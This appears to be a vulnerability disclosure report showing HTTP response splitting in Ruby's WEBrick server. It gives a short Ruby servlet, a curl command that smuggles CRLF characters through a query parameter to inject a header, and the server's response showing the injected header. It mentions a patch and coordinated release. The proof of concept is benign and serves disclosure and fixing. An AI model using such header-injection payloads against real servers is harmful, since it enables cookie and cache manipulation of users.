## Vulnerability Information
Hi,

WEBrick seems to be vulnerable to a [response splitting attack](https://www.owasp.org/index.php/HTTP_Response_Splitting).  The reproduction script is very similar to the code shown on the owasp page:

```ruby
require 'webrick'

class MyServlet < ::WEBrick::HTTPServlet::AbstractServlet
  def service req, res
    res.cookies << WEBrick::Cookie.new('author', req.query['author'])
    res.body = 'hello world'
  end
end

server = ::WEBrick::HTTPServer.new Port: 8080
server.mount "/", MyServlet
trap('INT') { server.shutdown }
server.start
```

From the command line do:

```
$ curl -i localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked
```

The response looks like this:

```
HTTP/1.1 200 OK 
Server: WEBrick/1.3.1 (Ruby/2.4.0/2016-07-12)
Date: Mon, 25 Jul 2016 19:13:18 GMT
Content-Length: 11
Connection: Keep-Alive
Set-Cookie: author=Aaron
X-Foo: hacked

hello world
```

You can see the header has been injected.  I've attached a patch to fix the issue.

Note:  It seems like many Ruby webservers are vulnerable to this attack.  So we may need to coordinate release.
